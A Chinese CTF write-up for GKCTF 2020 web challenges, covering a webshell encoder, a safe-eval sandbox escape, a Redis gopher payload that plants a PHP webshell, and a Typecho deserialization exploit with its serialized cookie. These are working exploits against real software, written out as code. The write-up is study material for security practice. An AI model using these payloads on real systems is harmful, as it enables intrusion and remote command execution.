# GKCTF 2020

## 前言

比赛当天有事，然后就没咋打，但是赛后复现发现题目出的好棒

## 0x01 Checkin

直接给了``eval``后门，但是得用base64编码，
于是手写个蚁剑编码器

```js
/**
 * php::base64编码器
 * Create at: 2020/05/24 10:13:32
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 以下代码为 PHP Base64 样例

  // 生成一个随机变量名
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  // 原有的 payload 在 data['_']中
  // 取出来之后，转为 base64 编码并放入 randomID key 下
  data[randomID] = Buffer.from(data['_']).toString('base64');

  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
  data[pwd] = new Buffer(`eval(base64_decode($_POST[${randomID}]));die();`).toString('base64');

  // ##########    请在上方编写你自己的代码   ###################

  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}
```

然后就能连上了，但是``/var/html``目录下没法写其他文件

而且得绕``disabled_functions``

于是乎用蚁剑执行脚本的插件

传一个``hack.so``

就能绕过了


![](/assets/images/gkctf2020-p1.png)

## 0x02 CVE Checkin

后来放了提示是``cve-2020-7066``

但其实应该fuzz到吧....

然后就是做题的时候特意开了个靶机去监听

后来发现访问``127.0.0.1``直接有提示

傻了傻了....

## 0x03 老八小超市儿

渗透题

没去想后台地址弱密码还是经验太少了or2

然后就是看传文件点，传个shell上去

但是文件具体在哪又找了半天

如果传在默认主题zip的``default/__static__/eki.php``


那么访问路由应该是下面这样

```
/public/static/index/default/eki.php
```

getshell完了，根据提示，去找生成的脚本（因为这个脚本是由root权限+定时执行的）

改造下这个脚本，反弹shell，就拿到root权限了

## 0x04 EZ三剑客-EzNode

这题用了一个setTimeOut 去官网查的话会发现有个问题

> 当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1。 非整数的 delay 会被截断为整数。

根据

```js
// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) => {
  if (req.path === '/eval') {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() => next(), delay);//让这里的delay > 2147483647 可以绕过后面了
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});
```

然后后面给了包名和包版本，那么去找下有无CVE

找到

https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901

EXP： 

```js
#coding=utf-8
import requests
import urllib
data={
"e":"""(function () {
  const f = Buffer.prototype.write;
  const ft = {
    length: 10,
    utf8Write(){

    }
  };
  function r(i){
    var x = 0;
    try{
      x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
      return x;
    if(x!==i)
      return x+1;
    try{
      f.call(ft);
    }catch(e){
      return e;
    }
    return null;
  }
  var i=1;
  while(1){
    try{
      i=r(i).constructor.constructor("return process")();
      break;
    }catch(x){
      i++;
    }
  }
  return i.mainModule.require("child_process").execSync("cat /flag").toString()
}()).toString()"""
}
req = requests.post("http://67f6b840-8d56-441f-87ad-95fe0da057b3.node3.buuoj.cn/eval?delay=2147483649",data=data)

print req.text
```

## 0x05 EzWeb

F12源码提示了``?secret``

可以拿到靶机的内网地址

应该是想办法内网渗透

会的东西太少了，思路比较狭窄or2

看了wp发现是考察redis未授权访问getshell

就是还可以访问到另一台开着redis服务的机子存在未授权访问漏洞

直接利用``gopher``协议写shell拿到flag

payload 生成

```python
import urllib
protocol="gopher://"
ip=""#填redis服务机的ip
port="6379"
shell="\n\n<?php system(\"cat /flag\");?>\n\n"
filename="eki.php"
path="/var/www/html"
passwd=""
cmd=[
    "flushall",
    "set 1 {}".format(shell.replace(" ","${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
    ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ") 
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

打完就可以访问对应ip下的``/eki.php``获得flag

## 0x06 EzTypecho

看源码好像没啥修改，似乎typecho的反序列化exp还能用

然后就是加了一个必须拿到session的条件

之前任意文件上传的时候刚好遇到过

```
https://www.php.net/manual/zh/session.upload-progress.php
```

利用

> 当 ``session.upload_progress.enabled`` INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态

>当一个上传在处理中，同时POST一个与INI中设置的``session.upload_progress.name``同名变量时，上传进度可以在``$_SESSION``中获得。 当PHP检测到这种POST请求时，它会在``$_SESSION``中添加一组数据, 索引是 ``session.upload_progress.prefix ``与 ``session.upload_progress.name``连接在一起的值。

强行上传一个文件

就可以强行拿到session了

然后还是用那个经典exp

```php
<?php

class Typecho_Feed
{
        const RSS2 = 'RSS 2.0';
        const ATOM1 = 'ATOM 1.0';

        private $_type;
        private $_items;

        public function __construct() {
                //$this->_type = $this::RSS2;

                $this->_type = $this::ATOM1;
                $this->_items[0] = array(
                        'category' => array(new Typecho_Request()),
                        'author' => new Typecho_Request(),
                );
        }
}

class Typecho_Request
{
        private $_params = array();
        private $_filter = array();

        public function __construct() {
                $this->_params['screenName'] = "cat /flag";
                $this->_filter[0] = 'system';
        }
}

$exp = array(
        'adapter' => new Typecho_Feed(),
        'prefix'  => 'typecho_'
);

echo base64_encode(serialize($exp));
?>
```

Exp:

```python
#coding=utf-8
import requests

s = requests.Session()

files = {"file":"eki"}

cookies = {
    "PHPSESSID":"test",
    "__typecho_config":"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9"
}

headers ={
    "Referer":"http://30205fa6-2384-4aca-bb0f-8b217b32b0e6.node3.buuoj.cn/install.php"
}

data = {
    "PHP_SESSION_UPLOAD_PROGRESS": "123456789"
}

req = s.post("http://30205fa6-2384-4aca-bb0f-8b217b32b0e6.node3.buuoj.cn/install.php?finish=1",files=files,cookies=cookies,headers=headers,data=data)

print req.text
```